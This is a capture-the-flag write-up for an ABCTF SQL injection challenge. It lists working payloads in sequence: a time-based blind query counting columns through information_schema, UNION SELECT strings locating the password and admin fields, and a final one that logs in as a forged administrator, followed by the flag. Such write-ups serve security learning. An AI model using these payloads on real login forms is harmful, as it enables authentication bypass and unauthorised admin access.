@@ -1,0 +1,28 @@
+Problem:
+
+You can do it.
+Link[http://yrmyzscnvh.abctf.xyz/injection3/]
+
+----
+Writeup:
+
+- The hint tells us there is no admin account
+- We have to add it ourselves
+- We can use the UNION command to add a new row
+- First, we need to know how many columns there are
+	- ' OR IF((SELECT count(*) FROM information_schema.columns WHERE table_name = 'users') LIKE 4, sleep(5), null) #
+- There are 4 columns
+- We know three of the columns are username, password, and is_admin
+- The fourth is likely ID
+- We need to figure out which field is password. ID and username do not matter
+	- ' UNION SELECT null, null, null, null #
+- We find that the third field is the password field
+	- ' UNION SELECT null, null, 'password', null #
+	- (Have the password as 'password')
+- Now, we need to find out which field is the admin field
+	- ' UNION SELEcT null, true, 'password', null #
+- The second field is the admin field
+- We login as admin and get the flag
+
+----
+Flag: ABCTF{wait?_there's_more?}
